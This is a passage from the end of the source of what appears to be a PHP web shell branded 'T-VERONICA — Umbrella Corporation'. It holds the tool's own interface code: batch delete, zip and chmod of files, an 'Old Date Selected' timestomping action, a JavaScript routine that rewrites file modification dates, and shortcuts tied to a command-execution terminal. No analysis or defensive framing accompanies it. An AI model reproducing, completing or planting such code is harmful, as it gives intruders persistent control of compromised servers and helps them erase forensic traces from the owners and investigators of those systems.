echo '<select name=batch_act style="padding:5px 8px"><option value=delete>Delete Selected</option><option value=zip>Zip Selected</option><option value=chmod>Chmod Selected</option><option value=olddate>Old Date Selected</option></select>';
echo '<input type=text name=batch_chmod placeholder="0755" style="width:60px">';
echo '<input type=submit name=batch_go value="Apply" class="btn" onclick="return confirm(\'Apply to selected?\')">';
echo '</div></form>';
?>
</div>
<div class="ft">T-VERONICA &mdash; Umbrella Corporation</div>
</div>
<script>
function chdt(el){var d=prompt('New date (YYYY-MM-DD HH:MM:SS):',el.getAttribute('data-d'));if(d){var f=document.createElement('form');f.method='post';f.style.display='none';var i1=document.createElement('input');i1.name='cd_val';i1.value=d;var i2=document.createElement('input');i2.name='cd_path';i2.value=el.getAttribute('data-p');var i3=document.createElement('input');i3.name='do_chdate';i3.value='1';f.appendChild(i1);f.appendChild(i2);f.appendChild(i3);document.body.appendChild(f);f.submit();}}
document.addEventListener('keydown',function(e){
if((e.ctrlKey||e.metaKey)&&e.key==='s'){e.preventDefault();var b=document.querySelector('input[name=do_save]');if(b)b.click();}
if((e.ctrlKey||e.metaKey)&&e.key==='Enter'){e.preventDefault();var r=document.querySelector('input[name=cmd_go]');if(r)r.click();else window.location.href='?<?php echo $_qp; ?>&path='+encodeURIComponent('<?php echo $_cd; ?>')+'&term=1';}
if(e.key==='Escape'){var links=document.querySelectorAll('a.ghost');for(var i=0;i<links.length;i++){if(links[i].textContent==='Close'||links[i].textContent==='Cancel'){links[i].click();break;}}}
});
</script>
</body></html>
